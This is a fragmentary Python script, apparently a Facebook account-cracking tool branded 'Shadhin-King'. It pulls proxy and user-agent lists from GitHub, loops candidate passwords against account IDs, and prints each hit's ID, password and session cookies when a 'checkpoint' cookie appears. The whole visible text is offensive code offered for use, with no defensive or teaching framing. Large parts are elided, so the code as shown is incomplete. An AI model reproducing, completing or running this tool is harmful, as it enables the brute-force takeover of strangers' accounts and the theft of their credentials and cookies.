...
princp=[]
try:
    prox= requests.get('https://github.com/Shadhin-King-999/Api/blob/main/prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Shadhin-King-999/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Shadhin.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[Shadhin-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
